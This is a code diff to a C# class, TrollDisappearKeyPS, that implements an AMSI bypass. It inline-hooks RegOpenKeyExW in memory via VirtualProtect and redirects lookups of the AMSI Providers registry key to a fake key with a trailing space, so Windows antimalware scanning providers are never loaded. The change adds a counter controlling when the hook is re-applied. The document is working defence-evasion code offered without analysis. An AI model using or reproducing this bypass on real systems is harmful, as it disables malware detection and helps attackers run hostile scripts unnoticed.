@@ -20,10 +20,11 @@ public static class TrollDisappearKeyPS
     [DllImport("kernel32.dll", SetLastError = true)]
     public static extern bool VirtualProtect(IntPtr lpAddress, int size, int newProtect, out int oldProtect);
 
-    static  public int oldProtect;
+    static public int oldProtect;
     static public IntPtr targetAddr, hookAddr;
     static public byte[] originalBytes = new byte[12];
     static public byte[] hookBytes = new byte[12];
+    static public int counter;
 
 
     public static void DisappearKey()
@@ -33,9 +34,9 @@ public static class TrollDisappearKeyPS
         hookAddr = Marshal.GetFunctionPointerForDelegate(A);
         Marshal.Copy(targetAddr, originalBytes, 0, 12);
 
-        hookBytes = new byte[] { 0x48, 0xB8 }        
+        hookBytes = new byte[] { 0x48, 0xB8 }
             .Concat(BitConverter.GetBytes(hookAddr.ToInt64()))
-            .Concat(new byte[] { 0x50, 0xC3 })         
+            .Concat(new byte[] { 0x50, 0xC3 })
             .ToArray();
 
         VirtualProtect(targetAddr, 12, 0x40, out oldProtect);
@@ -51,6 +52,7 @@ public static class TrollDisappearKeyPS
 
             if (lpSubKey == @"Software\Microsoft\AMSI\Providers")
             {
+                counter = counter + 1; 
                 return RegOpenKeyExW(hKey, @"Software\Microsoft\AMSI\Providers ", ulOptions, samDesired, out phkResult);
             }
             return RegOpenKeyExW(hKey, lpSubKey, ulOptions, samDesired, out phkResult);
@@ -58,9 +60,9 @@ public static class TrollDisappearKeyPS
         }
         finally
         {
-            Marshal.Copy(hookBytes, 0, targetAddr, hookBytes.Length);
+            if (counter == 0) { Marshal.Copy(hookBytes, 0, targetAddr, hookBytes.Length); }
+            
         }
     }
 }
-
 
